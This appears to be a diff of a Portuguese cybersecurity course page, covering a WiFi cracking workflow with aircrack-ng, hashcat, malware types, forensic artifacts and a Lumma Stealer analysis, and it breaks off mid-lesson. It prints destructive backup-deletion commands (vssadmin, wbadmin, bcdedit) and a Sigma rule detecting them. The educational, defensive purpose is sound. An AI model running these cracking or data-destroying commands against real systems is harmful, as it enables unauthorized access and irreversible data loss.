+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-15')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 16 -->
+				<article class="lesson-card" id="hack-16">
+					<h2 class="lesson-title">
+						<span class="num-badge">16</span>
+						<span>Hashes &amp; Criptografia Aplicada com Regras</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Identificação de hashes e técnicas de mutação:</p>
+						<div class="code-wrapper">
+							<div class="code-header"><span>BASH</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code># Identificar tipo de hash
+hashid 'e99a18c428cb38d5f260853678922e03'
+
+# Uso de regras do Hashcat para gerar permutações em wordlists (ex: leet speak, sufixos)
+hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code></pre>
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-16')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 17 -->
+				<article class="lesson-card" id="hack-17">
+					<h2 class="lesson-title">
+						<span class="num-badge">17</span>
+						<span>Hacking de Redes Sem Fio (WiFi)</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Fluxo de auditoria sem fio no laboratório:</p>
+						<div class="code-wrapper">
+							<div class="code-header"><span>BASH — Fluxo Aircrack-ng</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code># 1. Ativar modo monitor no adaptador WiFi
+airmon-ng start wlan0
+
+# 2. Descobrir redes ao redor
+airodump-ng wlan0mon
+
+# 3. Capturar handshake no canal e BSSID alvo
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon
+
+# 4. Desautenticar cliente para forçar handshake
+aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# 5. Quebrar a senha
+aircrack-ng captura-01.cap -w rockyou.txt</code></pre>
+						</div>
+						<p><strong>Adaptadores Recomendados:</strong> Chipsets Atheros AR9271 ou Realtek RTL8812AU (suportam injeção de pacotes e modo monitor).</p>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-17')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 18 -->
+				<article class="lesson-card" id="hack-18">
+					<h2 class="lesson-title">
+						<span class="num-badge">18</span>
+						<span>Malware &amp; Ofensiva Moderna (Conceitos para Defensores)</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Como equipes de Red Team ético operam frameworks C2 e testam defesas:</p>
+						<ul>
+							<li><strong>Frameworks C2 Modernos:</strong> Sliver, Mythic, Havoc.</li>
+							<li><strong>Evasão:</strong> AMSI bypass, ofuscação de scripts PowerShell e injeção em memória.</li>
+							<li><strong>Mecanismos de Persistência:</strong> Run Keys no Registro, Tarefas Agendadas (Scheduled Tasks), Serviços do Windows e WMI Subscriptions.</li>
+							<li><strong>MITRE ATT&amp;CK:</strong> Matriz global de referência sobre táticas, técnicas e procedimentos (TTPs) de atacantes.</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-18')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 19 -->
+				<article class="lesson-card" id="hack-19">
+					<h2 class="lesson-title">
+						<span class="num-badge">19</span>
+						<span>Defesa: O Outro Lado da Moeda (Blue Team)</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Aprender como atacar transforma você em um profissional de defesa incomparável:</p>
+						<ul>
+							<li><strong>Centralização de Logs &amp; SIEM:</strong> ELK Stack, Wazuh, Splunk.</li>
+							<li><strong>Detecção Comportamental:</strong> Regras Sigma e assinaturas YARA.</li>
+							<li><strong>Threat Hunting:</strong> Busca ativa por anomalias e indicadores de comprometimento (IOCs) na rede.</li>
+							<li><strong>Hardening Básico:</strong> CIS Benchmarks, segmentação de subnets, desativação de protocolos legados e autenticação multifator (MFA).</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-19')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 20 -->
+				<article class="lesson-card" id="hack-20">
+					<h2 class="lesson-title">
+						<span class="num-badge">20</span>
+						<span>Roteiro de Estudos Estruturado (90 Dias)</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Um cronograma focado para acelerar sua transição do zero à primeira certificação prática:</p>
+						<ul>
+							<li><strong>Semanas 1–2 (Fundamentos):</strong> OverTheWire Bandit (até nível 20+), Redes TCP/IP, Nmap e Wireshark.</li>
+							<li><strong>Semanas 3–4 (Web):</strong> PortSwigger Academy (todos os labs de SQLi, XSS, Autenticação) e trilhas Web do TryHackMe.</li>
+							<li><strong>Semanas 5–6 (Explotação &amp; Privesc):</strong> Metasploit, shells manuais, LinPEAS/winPEAS e 10 boxes easy no HackTheBox.</li>
+							<li><strong>Semanas 7–8 (Active Directory):</strong> TryHackMe "Attacktive Directory", BloodHound, Impacket e Pivoting.</li>
+							<li><strong>Semanas 9–12 (Consolidação):</strong> Boxes intermediárias no HTB, documentação de relatórios (writeups) e preparação para certificações (eJPT / PJPT / OSCP).</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-20')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 21 -->
+				<article class="lesson-card" id="hack-21">
+					<h2 class="lesson-title">
+						<span class="num-badge">21</span>
+						<span>Marcos Históricos da Cultura Hacker</span>
+					</h2>
+					<div class="lesson-body">
+						<ul>
+							<li><strong>1971:</strong> Apito do cereal Cap'n Crunch emite 2600 Hz liberando troncos telefônicos (início do <em>phreaking</em> com John Draper).</li>
+							<li><strong>1988:</strong> Morris Worm derruba aproximadamente 10% de toda a internet da época.</li>
+							<li><strong>1999:</strong> Criação do padrão CVE para catalogação pública de falhas de segurança.</li>
+							<li><strong>2010:</strong> Stuxnet destrói centrífugas nucleares com extrema precisão cibernética.</li>
+							<li><strong>2016:</strong> Mirai Botnet escraviza câmeras e dispositivos IoT com senhas padrão para derrubar grandes serviços DNS.</li>
+							<li><strong>2017:</strong> WannaCry e NotPetya disseminam ransomware e wipers globalmente explorando o EternalBlue.</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-21')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Tópico 22 -->
+				<article class="lesson-card" id="hack-22">
+					<h2 class="lesson-title">
+						<span class="num-badge">22</span>
+						<span>Legislação Aplicada — Leitura Obrigatória</span>
+					</h2>
+					<div class="lesson-body">
+						<div class="callout-box legal">
+							<div class="callout-header">⚖️ LEGISLAÇÃO BRASILEIRA (CÓDIGO PENAL)</div>
+							<strong>Artigo 154-A do Código Penal (Lei 12.737/2012 — Lei Carolina Dieckmann):</strong> Invadir dispositivo informático alheio, conectado ou não à rede de computadores, mediante violação indevida de mecanismo de segurança e sem autorização expressa ou tácita do titular do dispositivo para obter, adulterar ou destruir dados ou informações ou instalar vulnerabilidades.<br><br>
+							<em>Pena:</em> Reclusão e multa. "Apenas testar" ou escanear sem permissão constitui crime formal. Pratique estritamente em plataformas autorizadas e laboratórios pessoais.
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('hack-22')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+
+				<!-- ==================== PARTE 3 ==================== -->
+				<div class="part-banner" style="border-color: var(--accent-danger); box-shadow: 0 6px 30px rgba(255, 0, 85, 0.18);">
+					<div>
+						<div class="part-banner-title">🔴 Parte 3 — Análise de Malware &amp; Engenharia Reversa</div>
+						<p style="font-size: 13.5px; opacity: 0.85; margin-top: 4px;">Entendendo detalhadamente o que acontece no sistema operacional quando códigos maliciosos são executados.</p>
+					</div>
+					<span class="part-badge" style="background: rgba(255, 0, 85, 0.2); border: 1px solid var(--accent-danger); color: var(--accent-danger) !important;">Nível Avançado</span>
+				</div>
+
+				<!-- M1 -->
+				<article class="lesson-card" id="mal-1">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-danger);">M1</span>
+						<span>O Ciclo de Vida de uma Execução Maliciosa</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Quase toda família de malware moderna opera em um pipeline de 6 estágios sequenciais:</p>
+
+						<div class="code-wrapper">
+							<div class="code-header"><span>FLUXOGRAMA — Pipeline de Execução de Malware</span></div>
+							<pre><code>EXECUÇÃO
+   │
+   ▼
+[1] SOBREVIVÊNCIA INICIAL ─── Anti-VM, anti-debug, checagem de ambiente sandbox
+   │                          (Sou uma VM? Devo executar ou dormir?)
+   ▼
+[2] ESTABELECIMENTO ────────── Descompacta payload real em memória, injeta em processo legítimo
+   │
+   ▼
+[3] PERSISTÊNCIA ───────────── Garante sobrevivência a reboots (Run keys, tasks, WMI)
+   │
+   ▼
+[4] C2 / COMUNICAÇÃO ──────── Beacon para servidor de comando e controle, recebe comandos
+   │
+   ▼
+[5] CARGA ÚTIL ─────────────── Ação real: roubo de credenciais, cifragem, destruição
+   │
+   ▼
+[6] LIMPEZA / ANTI-FORENSE ─── Apaga logs de eventos, shadow copies e históricos</code></pre>
+						</div>
+
+						<div class="content-table-wrap">
+							<table class="content-table">
+								<thead>
+									<tr>
+										<th>Técnica Anti-Análise</th>
+										<th>Como Funciona</th>
+										<th>Como Neutralizar no Lab</th>
+									</tr>
+								</thead>
+								<tbody>
+									<tr>
+										<td><code>IsDebuggerPresent</code></td>
+										<td>API que verifica a flag PEB.BeingDebugged</td>
+										<td>Patch de flag no depurador x64dbg / ScyllaHide</td>
+									</tr>
+									<tr>
+										<td><strong>Checagem de Uptime / MAC</strong></td>
+										<td>Detecta se o sistema ligou há poucos segundos ou MAC VMware</td>
+										<td>Configurar uptime real e mascarar endereço MAC</td>
+									</tr>
+									<tr>
+										<td><strong>Sleep Estendido</strong></td>
+										<td>Chamada <code>Sleep(0xFFFFFFF)</code> para estourar timeout de sandbox</td>
+										<td>Acelerar chamadas temporais com utilitários tipo Faketime</td>
+									</tr>
+								</tbody>
+							</table>
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('mal-1')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- M2 -->
+				<article class="lesson-card" id="mal-2">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-danger);">M2</span>
+						<span>Malware que Destrói: Wipers</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Diferente de ransowares, <strong>wipers</strong> não possuem chave de recuperação. Seu único propósito é a destruição irreversível dos dados:</p>
+						<ul>
+							<li><strong>Técnica A (Sobrescrita Direta):</strong> Abre arquivos em modo exclusivo e grava zeros ou bytes aleatórios sobre o conteúdo original antes de truncar o tamanho para 0.</li>
+							<li><strong>Técnica B (Destruição de Estrutura de Disco):</strong> Sobrescreve o MBR/GPT ou a tabela <code>$MFT</code> do NTFS (Exemplos: <em>Shamoon</em>, <em>NotPetya</em>, <em>HermeticWiper</em>).</li>
+							<li><strong>Técnica C (Destruição via APIs):</strong> Executa comandos para impedir recuperação do sistema:
+								<div class="code-wrapper">
+									<div class="code-header"><span>CMD / POWERSHELL</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+									<pre><code>vssadmin delete shadows /all /quiet
+wbadmin delete catalog -quiet
+bcdedit /set recoveryenabled No</code></pre>
+								</div>
+							</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('mal-2')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- M3 -->
+				<article class="lesson-card" id="mal-3">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-danger);">M3</span>
+						<span>Malware que Rouba: Infostealers</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Os <strong>Infostealers</strong> (RedLine, Raccoon, Lumma, Vidar, Stealc) são comercializados como <em>Malware-as-a-Service (MaaS)</em>. Em 2 a 5 minutos coletam:</p>
+						<ul>
+							<li><strong>Cookies &amp; Senhas Salvas:</strong> Extraídos dos bancos SQLite do Chrome (<code>Login Data</code>), descriptografados via DPAPI na sessão do usuário.</li>
+							<li><strong>Carteiras de Criptomoedas:</strong> Extensões de navegador (MetaMask, TrustWallet) e arquivos de carteiras desktop (Exodus).</li>
+							<li><strong>Tokens de Sessão:</strong> Discord, Telegram Desktop (<code>tdata</code>) e Steam.</li>
+						</ul>
+						<div class="callout-box warning">
+							<div class="callout-header">⚠️ O PERIGO DOS STEALERS "ONE-SHOT"</div>
+							A maioria dos stealers encerra a execução e se auto-deleta sem criar persistência. O estrago, porém, é imediato e permanente: os tokens e cookies de sessão capturados permitem contornar senhas e autenticação de dois fatores (MFA) durante semanas.
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('mal-3')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- M4 -->
+				<article class="lesson-card" id="mal-4">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-danger);">M4</span>
+						<span>Malware que Prende: Ransomware Passo a Passo</span>
+					</h2>
+					<div class="lesson-body">
+						<p>O modelo operacional dos grandes grupos de ransomware (LockBit, BlackCat):</p>
+						<ol>
+							<li><strong>Acesso Inicial:</strong> Credenciais vazadas compradas em mercados underground ou VPNs sem MFA.</li>
+							<li><strong>Recon &amp; Escalação:</strong> Mapeamento com BloodHound, Kerberoasting e dump de credenciais LSASS.</li>
+							<li><strong>Preparação &amp; Dupla Extorsão:</strong> Exfiltração de gigabytes de dados sensíveis para a nuvem antes da cifragem, desativação de EDR via drivers vulneráveis (BYOVD) e exclusão de backups.</li>
+							<li><strong>Detonação em Massa:</strong> Disparo via GPO / PsExec para milhares de máquinas simultâneas, gerando chaves simétricas AES-256 por arquivo e cifrando a chave simétrica com chave pública assimétrica RSA-2048/4096.</li>
+						</ol>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('mal-4')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- M5 -->
+				<article class="lesson-card" id="mal-5">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-danger);">M5</span>
+						<span>Malware que Vigia: RATs, Keyloggers &amp; Spyware</span>
+					</h2>
+					<div class="lesson-body">
+						<p><strong>RATs (Remote Access Trojans):</strong> Ferramentas como Quasar, AsyncRAT e njRAT concedem controle total em tempo real (streaming de tela, microfone, gerenciador de arquivos e injeção de processos).</p>
+						<p><strong>Técnicas de Keylogging:</strong> Ganchos de API do sistema (<code>SetWindowsHookEx</code>), leitura direta de buffers de kernel ou screenshots periódicos acoplados a OCR.</p>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('mal-5')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- M6 -->
+				<article class="lesson-card" id="mal-6">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-danger);">M6</span>
+						<span>Malware de Sistema: Rootkits &amp; Bootkits UEFI</span>
+					</h2>
+					<div class="lesson-body">
+						<ul>
+							<li><strong>Rootkits em Modo Usuário:</strong> Injeção de DLLs e interceptação de chamadas (API Hooking) para mascarar processos de listagens como o Gerenciador de Tarefas.</li>
+							<li><strong>Rootkits de Kernel (Ring 0):</strong> Executam no nível mais privilegiado do processador abusando de drivers assinados vulneráveis (BYOVD — <em>Bring Your Own Vulnerable Driver</em>).</li>
+							<li><strong>Bootkits UEFI:</strong> Infectam o firmware da placa-mãe (SPI Flash) iniciando antes do sistema operacional e contornando o Secure Boot (Exemplos: <em>LoJax</em>, <em>MoonBounce</em>, <em>BlackLotus</em>).</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('mal-6')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- M7 -->
+				<article class="lesson-card" id="mal-7">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-danger);">M7</span>
+						<span>Artefatos Forenses — O que Fica para Trás</span>
+					</h2>
+					<div class="lesson-body">
+						<div class="content-table-wrap">
+							<table class="content-table">
+								<thead>
+									<tr>
+										<th>Artefato Windows</th>
+										<th>Localização</th>
+										<th>Evidência Revelada</th>
+									</tr>
+								</thead>
+								<tbody>
+									<tr>
+										<td><strong>Prefetch</strong></td>
+										<td><code>C:\Windows\Prefetch\*.pf</code></td>
+										<td>Histórico de programas executados e horários</td>
+									</tr>
+									<tr>
+										<td><strong>Event Logs</strong></td>
+										<td><code>%SystemRoot%\System32\winevt\Logs</code></td>
+										<td>Eventos de logon, serviços criados e comandos Sysmon</td>
+									</tr>
+									<tr>
+										<td><strong>Shimcache / Amcache</strong></td>
+										<td>Registro do Windows</td>
+										<td>Caminhos e metadados de executáveis instalados</td>
+									</tr>
+									<tr>
+										<td><strong>Master File Table ($MFT)</strong></td>
+										<td>NTFS Root</td>
+										<td>Registros de todos os arquivos criados/deletados</td>
+									</tr>
+									<tr>
+										<td><strong>Memória RAM</strong></td>
+										<td>Dump Volatility 3</td>
+										<td>Injeções de código (<code>malfind</code>), DLLs e chaves criptográficas</td>
+									</tr>
+								</tbody>
+							</table>
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('mal-7')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- M8 -->
+				<article class="lesson-card" id="mal-8">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-danger);">M8</span>
+						<span>Montando seu Laboratório de Análise Seguro</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Arquitetura recomendada para detonação segura de amostras:</p>
+						<ul>
+							<li><strong>VM de Análise Linux:</strong> <code>REMnux</code> com ferramentas pré-instaladas (Ghidra, Radare2, PEstudio, capa, YARA, INetSim).</li>
+							<li><strong>VM Vítima Windows:</strong> Windows 10 limpo com suíte <code>FlareVM</code> instalada, Sysmon configurado e snapshots atualizados.</li>
+							<li><strong>Simulador de Internet (INetSim):</strong> O REMnux responde requisições DNS/HTTP/SMTP localmente para que o malware acredite que está conectado à internet sem enviar dados para a rede real.</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('mal-8')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- M9 -->
+				<article class="lesson-card" id="mal-9">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-danger);">M9</span>
+						<span>Análise Prática Passo a Passo &amp; Produção de IOCs</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Fluxo profissional de triagem e catalogação:</p>
+						<ol>
+							<li><strong>Triagem Estática:</strong> Calcular SHA-256, inspecionar strings e rodar <code>capa</code> para identificar capacidades do binário sem executá-lo.</li>
+							<li><strong>Execução Controlada:</strong> Iniciar monitoramento simultâneo com <code>Procmon</code>, <code>Wireshark</code> e captura de memória RAM.</li>
+							<li><strong>Análise de Memória:</strong> Utilizar Volatility (<code>windows.malfind</code> e <code>windows.dlllist</code>).</li>
+							<li><strong>Geração do Relatório de IOCs:</strong> Documentar hashes, domínios C2, mutexes criados e chaves de persistência para alimentar defesas de SIEM.</li>
+						</ol>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('mal-9')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- M10 -->
+				<article class="lesson-card" id="mal-10">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-danger);">M10</span>
+						<span>Casos Reais Estudados (WannaCry, NotPetya, SolarWinds)</span>
+					</h2>
+					<div class="lesson-body">
+						<ul>
+							<li><strong>WannaCry (2017):</strong> Propagação automática como worm via EternalBlue (SMB). O registro de um domínio kill-switch hardcoded desacelerou a infecção global.</li>
+							<li><strong>NotPetya (2017):</strong> Disseminado via supply chain no software fiscal M.E.Doc. Fingia ser ransomware, mas destruía irreversivelmente a estrutura do disco sem chave de recuperação.</li>
+							<li><strong>SolarWinds SUNBURST (2020):</strong> Comprometimento do pipeline de build oficial (CI/CD), distribuindo malware assinado digitalmente para mais de 18.000 organizações.</li>
+							<li><strong>BlackLotus (2023):</strong> Bootkit UEFI comercializado em fóruns que contorna o Secure Boot explorando a CVE-2023-24932.</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('mal-10')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- M11 -->
+				<article class="lesson-card" id="mal-11">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-danger);">M11</span>
+						<span>Defesa Efetiva &amp; Regras Sigma de Detecção</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Como detectar comportamentos maliciosos nos logs de telemetria corporativos:</p>
+
+						<div class="code-wrapper">
+							<div class="code-header"><span>YAML — Regra Sigma para Detecção de Exclusão de Shadow Copies</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code>title: VSSadmin Delete Shadows (Ransomware / Wiper Activity)
+logsource:
+  product: windows
+  service: process_creation
+detection:
+  selection:
+    CommandLine|contains: 'vssadmin delete shadows'
+  level: critical</code></pre>
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('mal-11')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+
+				<!-- ==================== PARTE 4 ==================== -->
+				<div class="part-banner" style="border-color: var(--accent-purple); box-shadow: 0 6px 30px rgba(157, 78, 221, 0.2);">
+					<div>
+						<div class="part-banner-title">🟣 Parte 4 — Análise Guiada: Lumma Stealer (LummaC2)</div>
+						<p style="font-size: 13.5px; opacity: 0.85; margin-top: 4px;">Estudo prático completo do infostealer mais prolífico do mundo e seu desmantelamento global.</p>
+					</div>
+					<span class="part-badge" style="background: rgba(157, 78, 221, 0.2); border: 1px solid var(--accent-purple); color: var(--accent-purple) !important;">Case Real de Engenharia Reversa</span>
+				</div>
+
+				<!-- Lumma 1 -->
+				<article class="lesson-card" id="lumma-1">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-purple);">L1</span>
+						<span>Contexto Operacional &amp; A Operação Global de 2025</span>
+					</h2>
+					<div class="lesson-body">
+						<p>O <strong>Lumma Stealer (LummaC2)</strong> foi o infostealer mais ativo entre 2022 e 2025, operado como Malware-as-a-Service com painéis de afiliados. Foi desmantelado em maio de 2025 em operação internacional conjunta (Microsoft DCU + Europol + DOJ), com a derrubada de ~2.300 domínios de C2 ativos.</p>
+						<p><strong>Vetores de Infecção Principais:</strong> Malvertising, falsos instaladores (Chrome/WhatsApp), campanhas <em>ClickFix</em> ("cole este comando no Executar/PowerShell"), links de cracks em vídeos do YouTube e <em>EtherHiding</em> (payloads ocultos em smart contracts da Binance Smart Chain).</p>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('lumma-1')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Lumma 2 -->
+				<article class="lesson-card" id="lumma-2">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-purple);">L2</span>
+						<span>Triagem Estática do Binário PE</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Análise de características estruturais com <code>pestudio</code> e <code>capa</code>:</p>
+						<ul>
+							<li><strong>Entropia Alta (&gt; 7.0):</strong> Indica que o payload está comprimido ou criptografado por um crypter stub.</li>
+							<li><strong>Tabela de Importação Mínima:</strong> Apenas funções básicas de resolução dinâmica de APIs (<code>VirtualAlloc</code>, <code>VirtualProtect</code>, <code>LoadLibraryA</code>, <code>GetProcAddress</code>).</li>
+							<li><strong>Detecção do capa:</strong> Identifica rotinas anti-debugging (<code>IsDebuggerPresent</code>), alocação de memória executável (RWX) e resolução de APIs por hashes customizados.</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('lumma-2')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Lumma 3 -->
+				<article class="lesson-card" id="lumma-3">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-purple);">L3</span>
+						<span>Análise Dinâmica &amp; Desempacotamento com pe-sieve</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Em vez de desconstruir manualmente algoritmos criptográficos complexos de crypters, execute o binário na VM de análise e deixe-o desempacotar o payload diretamente na memória RAM:</p>
+
+						<div class="code-wrapper">
+							<div class="code-header"><span>POWERSHELL / BASH — Extração com pe-sieve</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code># Na VM Windows: capturar blocos desempacotados da memória
+pe-sieve64.exe /pid <PID_DO_PROCESSO> /dir C:\lab\dump /imp 3
+
+# No REMnux: inspecionar strings do binário desempacotado
+strings -n 8 dumped.bin | grep -iE 'soft|chrom|gecko|wallet|Telegram'</code></pre>
+						</div>
+
+						<p><strong>Comportamento Típico no Procmon:</strong> Execução de <code>taskkill /f /im chrome.exe</code> para liberar locks dos bancos SQLite, leitura do arquivo <code>Local State</code> (chave DPAPI) e criação do arquivo ZIP temporário com os dados roubados.</p>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('lumma-3')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Lumma 4 -->
+				<article class="lesson-card" id="lumma-4">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-purple);">L4</span>
+						<span>Protocolo de Rede &amp; Extração de Configuração C2</span>
+					</h2>
+					<div class="lesson-body">
+						<p>No tráfego de rede (Wireshark / INetSim), o Lumma utiliza um protocolo HTTP POST em 3 estágios característicos:</p>
+						<ol>
+							<li><code>/gate/getadmin.php</code>: Handshake inicial com o painel para verificar se o IP da vítima deve ser processado.</li>
+							<li><code>/gate/bot.php</code>: Transmissão de telemetria básica da máquina infectada.</li>
+							<li><code>/gate/logs.php</code>: Upload do arquivo <code>.zip</code> protegido por senha contendo senhas, cookies e carteiras.</li>
+						</ol>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('lumma-4')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Lumma 5 -->
+				<article class="lesson-card" id="lumma-5">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-purple);">L5</span>
+						<span>Relatório IOC &amp; Mapeamento MITRE ATT&amp;CK</span>
+					</h2>
+					<div class="lesson-body">
+						<p>Táticas e técnicas do MITRE identificadas na análise técnica:</p>
+						<ul>
+							<li><strong>T1027:</strong> Obfuscated / Packed Files</li>
+							<li><strong>T1055:</strong> Process Injection</li>
+							<li><strong>T1555.003:</strong> Credentials from Web Browsers</li>
+							<li><strong>T1539:</strong> Steal Web Session Cookie</li>
+							<li><strong>T1041:</strong> Exfiltration Over C2</li>
+							<li><strong>T1070.001:</strong> Clear Windows Event Logs</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('lumma-5')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Lumma 6 -->
+				<article class="lesson-card" id="lumma-6">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-purple);">L6</span>
+						<span>Regras YARA &amp; Detecção Comportamental Sigma</span>
